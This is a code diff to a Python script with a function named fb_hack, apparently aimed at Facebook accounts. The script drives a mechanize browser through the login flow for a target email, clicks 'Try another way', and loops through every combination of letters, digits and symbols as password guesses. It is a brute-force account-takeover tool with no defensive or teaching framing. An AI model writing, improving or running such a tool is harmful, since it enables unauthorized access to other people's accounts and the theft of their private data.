@@ -1,11 +1,6 @@
-import itertools
-import sys
+import itertools, sys, requests, mechanize, os, re
 from time import sleep
 from bs4 import BeautifulSoup
-import requests
-import mechanize
-import os
-import re
 
 MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
               'AppleWebKit/534.7 (KHTML, like Gecko) ' \
@@ -55,6 +50,8 @@ def fb_hack(email, codex, respect):
   browser.click(coord=(428,18))
   browser.form['email'] = email
   browser.submit()
+  browser.select_form(nr=0)
+  browser.click(name='Try another way')
   counter = 0
   for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","!","#","$","%","^","&","*"], repeat=int(respect)):
     p = (''.join(map(str, combination)))
